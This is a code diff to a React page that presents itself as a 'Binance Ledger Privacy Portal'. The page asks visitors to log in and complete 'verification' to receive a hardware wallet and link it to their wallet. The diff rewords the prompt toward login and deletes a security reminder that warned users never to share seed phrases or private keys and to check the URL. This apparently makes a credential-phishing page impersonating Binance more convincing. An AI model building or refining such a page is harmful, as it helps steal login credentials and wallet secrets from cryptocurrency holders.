@@ -11,18 +11,18 @@ const Index = () => {
       <BinanceHeader />
       
       <main className="flex-grow">
-        {/* Hero Section */}
-        <div className="bg-binance-black py-10 md:py-16 relative overflow-hidden">
+        {/* Hero Section - made more compact */}
+        <div className="bg-binance-black py-6 md:py-10 relative overflow-hidden">
           <div className="container mx-auto px-4">
             <div className="max-w-5xl mx-auto">
               <div className="flex flex-col items-center text-center relative z-10">
-                <h1 className="text-2xl md:text-3xl lg:text-4xl font-bold mb-4">
+                <h1 className="text-2xl md:text-3xl lg:text-4xl font-bold mb-3 md:mb-4">
                   Binance Ledger <span className="text-binance-yellow">Privacy Portal</span>
                 </h1>
-                <p className="text-gray-300 text-base md:text-lg mb-6 max-w-2xl px-2 md:px-0">
+                <p className="text-gray-300 text-sm md:text-base mb-4 md:mb-6 max-w-2xl px-2 md:px-0">
                   Secure your crypto assets with the most trusted hardware wallet in the industry
                 </p>
-                <div className="flex justify-center space-x-3 md:space-x-4 mb-8">
+                <div className="flex justify-center space-x-3 md:space-x-4 mb-4 md:mb-8">
                   <div className="w-8 md:w-12 h-px bg-binance-yellow my-auto"></div>
                   <span className="text-binance-yellow text-sm md:text-base px-2 md:px-4">Trusted by millions</span>
                   <div className="w-8 md:w-12 h-px bg-binance-yellow my-auto"></div>
@@ -61,30 +61,16 @@ const Index = () => {
         </div>
         
         {/* Form Section - reduced top padding on mobile */}
-        <div className="container mx-auto px-2 sm:px-4 py-3 md:py-10 relative">
-          <div className="max-w-4xl mx-auto mb-6 md:mb-12 pt-3 md:pt-10 px-2 md:px-0">
-            <h2 className="text-xl md:text-2xl font-bold mb-3 md:mb-4">Ledger Verification</h2>
+        <div className="container mx-auto px-2 sm:px-4 py-3 md:py-6 relative">
+          <div className="max-w-4xl mx-auto mb-4 md:mb-8 pt-3 md:pt-4 px-2 md:px-0">
+            <h2 className="text-xl md:text-2xl font-bold mb-2 md:mb-3">Ledger Verification Portal</h2>
             <p className="text-gray-300 text-sm md:text-base">
-              To ensure the security of your assets, please complete the verification process below. 
-              This form will help us confirm your identity and link your wallet to your new Binance Ledger device.
+              Please complete the login and verification process below to receive your Binance Ledger device 
+              and link it securely to your wallet.
             </p>
           </div>
           
           <BinanceLedgerForm />
-          
-          <div className="max-w-2xl mx-auto mt-8 md:mt-12 bg-binance-darkGray/50 border border-gray-700 rounded-lg p-4 md:p-6">
-            <h3 className="text-lg md:text-xl font-medium mb-2 md:mb-3 text-binance-yellow">Security Reminder</h3>
-            <p className="text-gray-300 text-sm md:text-base mb-3 md:mb-4">
-              Binance will never ask for your private keys or seed phrases through unofficial channels. 
-              Always verify you are on the official Binance website before entering sensitive information.
-            </p>
-            <ul className="list-disc pl-5 text-gray-300 text-sm md:text-base space-y-1 md:space-y-2">
-              <li>Never share your private keys or seed phrases with anyone</li>
-              <li>Always verify the URL is correct before entering information</li>
-              <li>Enable two-factor authentication for all your accounts</li>
-              <li>Be cautious of phishing attempts and suspicious emails</li>
-            </ul>
-          </div>
         </div>
       </main>
       
